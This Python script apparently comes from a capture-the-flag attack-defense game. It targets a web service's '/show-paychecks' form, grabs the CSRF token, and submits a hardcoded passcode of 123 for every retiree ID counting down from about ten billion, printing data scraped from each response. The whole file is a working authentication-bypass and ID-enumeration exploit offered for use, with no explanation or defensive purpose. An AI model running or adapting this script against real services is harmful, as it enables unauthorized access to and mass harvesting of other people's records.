#!/usr/bin/env python3

import requests
import sys
from bs4 import BeautifulSoup


def request_ded(address, ded_id):
    url = f"http://{address}/show-paychecks"
    client = requests.session()
    form_soup = BeautifulSoup(client.get(url).content, "html.parser")
    csrf_token = form_soup.find("input", {"name": "csrf_token"})["value"]
    ret_soup = BeautifulSoup(client.post(url, data={
        "csrf_token": csrf_token,
        "retiree_id": ded_id,
        "passcode": 123
    }).content, "html.parser")
    pre = ret_soup.find("pre")
    if pre is None:
        return None
    ret = []
    for line in pre.contents[0].split("\n")[4:]:
        parts = line.strip().split(" ")
        if len(parts) < 5:
            break
        ret.append(parts[5])
    return ret


def main():
    address = sys.argv[1]
    for i in range(9999999998, 0, -1):
        ret = request_ded(address, i)
        if ret is None:
            break
        else:
            print(ret, flush=True)


if __name__ == "__main__":
    main()
